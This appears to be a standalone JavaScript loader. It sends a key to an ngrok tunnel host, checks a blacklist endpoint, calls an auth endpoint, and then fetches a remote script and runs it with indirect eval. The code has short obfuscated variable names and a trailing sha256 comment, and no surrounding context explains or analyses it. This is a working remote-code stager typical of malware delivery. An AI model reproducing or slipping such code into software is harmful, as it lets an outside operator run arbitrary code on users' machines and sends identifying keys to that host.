(async () => {
  const _U = "https://6398757a0a5d.ngrok-free.app",
        _J = JSON.stringify,
        _H = {"Content-Type": "application/json"};
  try {
    const key = await getKey(); 
    let C = await (await fetch(_U + "/checkBlackListIp", {
      method: "POST",
      headers: _H,
      body: _J({ key }) 
    })).json();
    if (C.status === 100) return;
    let R = await (await fetch(_U + "/auth", {
      method: "POST",
      headers: _H,
      body: _J({ key })
    })).json();
    if ([200, 800].includes(R.status) && R.scriptUrl) {
      let S = await (await fetch(R.scriptUrl + "?r=" + Math.random())).text();
      (0, eval)(S);
    }
  } catch (E) {
    console.log("[" + Date.now() + "] ERR::", E.message || E);
  }
})();

//sha256 FDE33B5A69C83963995FE61CD1DD862F1BF86CDBEE5495382D721D2AD9C686D4
